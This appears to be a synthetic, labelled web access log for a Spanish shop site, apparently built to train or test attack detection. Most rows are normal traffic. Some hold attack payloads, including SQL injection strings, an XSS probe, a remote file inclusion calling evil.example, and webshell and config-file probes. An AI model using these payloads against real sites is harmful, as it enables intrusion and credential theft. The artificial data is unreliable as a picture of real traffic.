datetime,ip,method,path,status,size,referer,user_agent,label;;;
2026-04-29T13:36:20.782117-05:00,153.25.38.59,GET,/index.html,200,188244,https://www.bing.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T13:37:01.782117-05:00,84.227.162.149,POST,/login,403,2081,-,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,brute_force;;
2026-04-29T13:40:44.782117-05:00,212.185.50.179,POST,/carrito,200,21050,https://www.google.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T13:41:14.782117-05:00,185.12.164.72,POST,/contacto,301,249822,-,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T13:41:15.782117-05:00,166.41.235.179,GET,/index.html,200,241625,https://www.google.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T13:41:30.782117-05:00,206.249.128.221,POST,/,200,141098,https://www.bing.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T13:42:58.782117-05:00,33.122.2.1,GET,/carrito,204,0,https://empresa.local/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T13:43:16.782117-05:00,213.117.239.25,GET,/blog/seguridad-digital,302,13462,https://www.bing.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T13:48:00.782117-05:00,142.95.214.96,GET,/buscar?q=laptop,302,121091,https://empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T13:49:47.782117-05:00,107.71.237.98,GET,/carrito,200,204453,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T13:50:01.782117-05:00,188.136.34.9,GET,/contacto,204,0,https://empresa.local/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T13:50:57.782117-05:00,16.84.247.13,POST,/productos/1002,404,127688,https://www.bing.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T13:52:50.782117-05:00,158.143.134.44,GET,/assets/style.css,200,181383,https://linkedin.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T13:53:28.782117-05:00,103.3.182.55,GET,/favicon.ico,200,50539,https://empresa.local/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T13:55:10.782117-05:00,176.232.144.169,GET,/api/v1/profile,200,214979,https://empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T13:56:58.782117-05:00,170.240.223.127,GET,/nosotros,200,81082,https://empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T13:57:13.782117-05:00,78.190.68.84,POST,/contacto,200,15091,https://linkedin.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T13:57:59.782117-05:00,212.184.164.33,GET,/dashboard,200,194472,-,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T13:59:36.782117-05:00,190.19.227.34,POST,/,200,77543,https://portal.empresa.local/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:01:42.782117-05:00,24.136.207.195,GET,/assets/style.css,401,23783,https://www.bing.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:02:48.782117-05:00,67.27.220.113,GET,/api/v1/profile,200,80359,https://www.google.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:03:42.782117-05:00,116.8.246.71,GET,/index.html,400,168439,https://www.google.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:05:34.782117-05:00,151.86.253.52,POST,/productos/1001,304,0,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:05:51.782117-05:00,136.63.85.228,GET,/favicon.ico,301,225032,https://www.google.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:06:37.782117-05:00,29.227.169.161,GET,/assets/app.js,302,178393,https://portal.empresa.local/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:06:57.782117-05:00,168.65.88.142,GET,/blog/seguridad-digital,200,62187,https://portal.empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:08:07.782117-05:00,174.185.106.159,POST,/index.html,401,32406,https://portal.empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:09:19.782117-05:00,13.253.255.88,HEAD,/login?user=admin' OR '1'='1,405,29687,-,Nmap Scripting Engine,sql_injection;;;
2026-04-29T14:09:42.782117-05:00,72.127.112.241,POST,/nosotros,204,0,https://portal.empresa.local/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:10:13.782117-05:00,82.155.32.225,GET,/nosotros,200,245178,https://portal.empresa.local/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:10:20.782117-05:00,150.86.126.48,GET,/assets/style.css,200,91797,https://linkedin.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:11:30.782117-05:00,91.45.224.127,POST,/favicon.ico,200,205688,https://www.bing.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:11:41.782117-05:00,213.51.231.131,POST,/buscar?q=laptop,200,194834,https://linkedin.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:12:40.782117-05:00,147.90.254.68,POST,/blog/seguridad-digital,400,40943,https://www.google.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:14:15.782117-05:00,152.159.84.151,POST,/api/v1/orders,200,203807,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:14:27.782117-05:00,132.21.36.123,HEAD,/images/2024/shell.jsp,405,77966,-,python-requests/2.31.0,webshell_probe;;;
2026-04-29T14:14:51.782117-05:00,156.193.230.146,GET,/checkout,200,25485,https://portal.empresa.local/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:15:22.782117-05:00,147.227.76.54,GET,/productos,403,42020,https://empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:15:57.782117-05:00,2.193.194.106,GET,/images/logo.png,200,137676,-,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:16:53.782117-05:00,17.63.102.7,GET,/index.html,404,149842,-,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:19:02.782117-05:00,221.107.5.173,GET,/carrito,400,131880,https://www.bing.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:20:41.782117-05:00,15.157.120.26,GET,/buscar?q=laptop,200,187586,https://empresa.local/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:21:22.782117-05:00,132.3.164.221,GET,/buscar?q=laptop,200,222919,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:21:47.782117-05:00,15.205.150.218,POST,/images/logo.png,404,168251,https://empresa.local/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:22:43.782117-05:00,153.181.80.213,GET,/login?user=admin' OR '1'='1,401,3423,-,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,sql_injection;;
2026-04-29T14:22:45.782117-05:00,149.136.255.61,POST,/carrito,400,203557,https://empresa.local/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:23:19.782117-05:00,172.131.153.92,GET,/home,204,0,https://linkedin.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:26:48.782117-05:00,211.139.202.79,GET,/images/logo.png,401,32498,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:26:57.782117-05:00,184.155.73.150,GET,/,200,23570,https://empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:27:14.782117-05:00,126.99.246.85,GET,/api/v1/profile,200,120035,https://portal.empresa.local/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:27:22.782117-05:00,30.183.75.87,GET,/assets/style.css,401,113143,https://www.google.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:28:02.782117-05:00,130.174.126.50,HEAD,/view?template=http://evil.example/shell.txt,401,76019,-,python-requests/2.31.0,lfi_rfi;;;
2026-04-29T14:28:53.782117-05:00,176.61.251.57,GET,/,400,141959,https://www.bing.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:29:48.782117-05:00,71.82.135.171,GET,/productos/1002,201,168410,https://portal.empresa.local/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:31:54.782117-05:00,3.64.110.221,POST,/login,304,0,https://empresa.local/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:32:16.782117-05:00,76.124.254.138,POST,/productos,302,133404,-,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:32:35.782117-05:00,50.185.19.143,GET,/favicon.ico,301,141413,https://www.google.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:33:07.782117-05:00,24.23.126.75,GET,/productos/1002,302,241832,-,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:33:33.782117-05:00,177.47.218.240,GET,/checkout,304,0,https://www.google.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:34:52.782117-05:00,76.96.181.68,GET,/login,200,91927,https://linkedin.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:35:29.782117-05:00,45.95.98.177,GET,/,400,112840,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:35:36.782117-05:00,162.150.136.80,GET,/images/logo.png,200,248093,https://portal.empresa.local/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:36:10.782117-05:00,181.224.188.192,POST,/contacto,302,135753,https://portal.empresa.local/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:36:24.782117-05:00,129.221.243.235,POST,/images/logo.png,200,249663,https://linkedin.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:36:36.782117-05:00,137.162.157.174,POST,/logout,404,128952,-,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:37:04.782117-05:00,52.209.6.164,GET,/config.php.bak,404,4433,https://www.google.com/,python-requests/2.31.0,scanner_recon;;;
2026-04-29T14:37:28.782117-05:00,21.94.64.218,GET,/carrito,200,48419,https://portal.empresa.local/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:37:49.782117-05:00,16.129.52.221,GET,/carrito,304,0,https://empresa.local/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:38:22.782117-05:00,138.156.252.142,POST,/assets/style.css,302,3544,https://www.bing.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:39:29.782117-05:00,79.11.85.148,GET,/,302,176440,https://linkedin.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:40:25.782117-05:00,54.185.202.54,POST,/contacto,403,84545,https://www.google.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:41:50.782117-05:00,8.234.146.221,GET,/buscar?q=laptop,200,87961,-,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:46:05.782117-05:00,45.124.96.194,GET,/contacto,200,44862,-,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:46:21.782117-05:00,134.236.237.154,POST,/images/logo.png,200,182657,https://www.google.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:47:22.782117-05:00,6.27.68.147,GET,/api/v1/profile,200,2108,-,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:48:21.782117-05:00,99.226.121.151,POST,/assets/style.css,200,91008,-,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:48:56.782117-05:00,129.194.51.49,POST,/login,204,0,https://empresa.local/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:51:42.782117-05:00,129.230.12.77,GET,/productos/1002,302,140432,https://linkedin.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T14:53:24.782117-05:00,198.187.43.189,GET,/carrito,201,133037,https://linkedin.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:54:39.782117-05:00,33.20.65.153,GET,/,403,99651,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T14:55:50.782117-05:00,78.126.103.0,GET,/api/v1/profile,403,239964,https://www.google.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T14:57:11.782117-05:00,124.21.79.109,GET,/assets/style.css,304,0,https://linkedin.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:57:31.782117-05:00,7.49.86.134,GET,/profile?name=%3Csvg%20onload%3Dalert(1)%3E,404,59152,-,sqlmap/1.7.9#stable,xss;;;
2026-04-29T14:58:22.782117-05:00,214.34.16.56,GET,/carrito,201,42139,https://linkedin.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:59:16.782117-05:00,109.162.201.225,GET,/,304,0,https://linkedin.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T14:59:28.782117-05:00,156.94.169.160,GET,/assets/app.js,403,80511,https://www.google.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T14:59:46.782117-05:00,45.67.8.177,GET,/dashboard,404,27020,https://linkedin.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:00:05.782117-05:00,59.144.109.136,GET,/favicon.ico,200,24753,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:00:34.782117-05:00,106.32.2.44,POST,/login,304,0,https://linkedin.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:02:39.782117-05:00,25.151.184.82,GET,/contacto,200,10608,https://portal.empresa.local/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:02:59.782117-05:00,147.94.44.40,GET,/nosotros,400,238599,https://empresa.local/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T15:04:33.782117-05:00,145.116.245.60,POST,/api/v1/profile,200,248944,https://empresa.local/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:06:22.782117-05:00,144.186.29.57,GET,/buscar?q=laptop,200,202703,https://portal.empresa.local/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:08:11.782117-05:00,50.255.245.32,GET,/productos,401,31452,https://portal.empresa.local/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:09:10.782117-05:00,26.87.154.186,GET,/productos/1001,204,0,https://linkedin.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T15:09:30.782117-05:00,59.137.86.69,POST,/logout,403,141706,https://linkedin.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:11:25.782117-05:00,75.14.196.12,GET,/carrito,302,67878,https://empresa.local/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:11:55.782117-05:00,140.74.23.52,POST,/nosotros,301,159608,https://www.google.com/,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:12:08.782117-05:00,41.153.57.77,POST,/blog/seguridad-digital,200,188626,https://www.google.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:13:08.782117-05:00,57.162.10.231,GET,/favicon.ico,401,234144,https://www.google.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:13:35.782117-05:00,149.20.232.111,GET,/blog/seguridad-digital,400,220341,https://empresa.local/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:18:23.782117-05:00,138.18.255.49,GET,/assets/app.js,403,95843,https://empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:18:50.782117-05:00,87.153.77.120,GET,/buscar?q=laptop,204,0,https://portal.empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:18:55.782117-05:00,130.174.126.50,GET,/api/v1/admin/stats,200,176210,-,Nikto/2.5.0,api_abuse;;;
2026-04-29T15:20:12.782117-05:00,218.29.61.172,GET,/nosotros,200,110008,https://www.bing.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T15:21:04.782117-05:00,100.26.75.117,POST,/productos/1002,200,50207,-,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:21:23.782117-05:00,8.23.93.209,GET,/productos,301,174639,https://www.bing.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:21:46.782117-05:00,74.245.61.255,GET,/buscar?q=laptop,400,68082,https://www.google.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:21:50.782117-05:00,172.126.147.125,GET,/api/v1/orders,304,0,https://www.bing.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:22:11.782117-05:00,223.64.254.5,GET,/productos/1001,301,189530,-,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:23:55.782117-05:00,114.19.167.225,POST,/dashboard,200,7138,https://linkedin.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:24:55.782117-05:00,109.62.72.73,GET,/logout,404,20388,https://www.google.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T15:26:20.782117-05:00,128.14.155.237,GET,/contacto,304,0,https://linkedin.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:26:21.782117-05:00,96.120.225.1,GET,/assets/app.js,401,75731,https://www.google.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T15:26:32.782117-05:00,218.68.13.239,GET,/carrito,201,53467,https://linkedin.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T15:26:38.782117-05:00,107.199.182.54,GET,/buscar?q=laptop,200,44161,-,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:30:13.782117-05:00,204.174.88.255,GET,/home,200,73770,-,Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0,normal;;
2026-04-29T15:31:28.782117-05:00,22.207.162.18,GET,/api/v1/profile,304,0,https://linkedin.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
"2026-04-29T15:33:25.782117-05:00,132.124.226.233,HEAD,""/productos?id=10 UNION SELECT username,password FROM users"",403,35802,-,Mozilla/5.0 zgrab/0.x,sql_injection";;;
2026-04-29T15:33:35.782117-05:00,52.209.6.164,GET,/admin/login,401,410,https://www.google.com/,python-requests/2.31.0,brute_force;;;
2026-04-29T15:35:02.782117-05:00,222.164.174.24,GET,/assets/app.js,200,138124,https://empresa.local/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:37:34.782117-05:00,20.103.183.59,GET,/buscar?q=laptop,201,139368,https://www.bing.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T15:38:16.782117-05:00,49.243.50.156,POST,/favicon.ico,200,143421,https://empresa.local/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
2026-04-29T15:38:22.782117-05:00,200.74.123.41,POST,/productos/1001,200,41982,https://linkedin.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36,normal;
2026-04-29T15:42:44.782117-05:00,36.206.49.97,GET,/login,302,44619,https://www.google.com/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T15:43:25.782117-05:00,129.180.147.169,GET,/api/v1/profile,301,244672,https://www.bing.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6 Safari/605.1.15,normal;;
2026-04-29T15:44:11.782117-05:00,116.238.35.14,GET,/assets/app.js,401,132802,https://empresa.local/,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1,normal;;
2026-04-29T15:45:59.782117-05:00,9.130.86.165,POST,/blog/seguridad-digital,304,0,https://linkedin.com/,Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36,normal;;
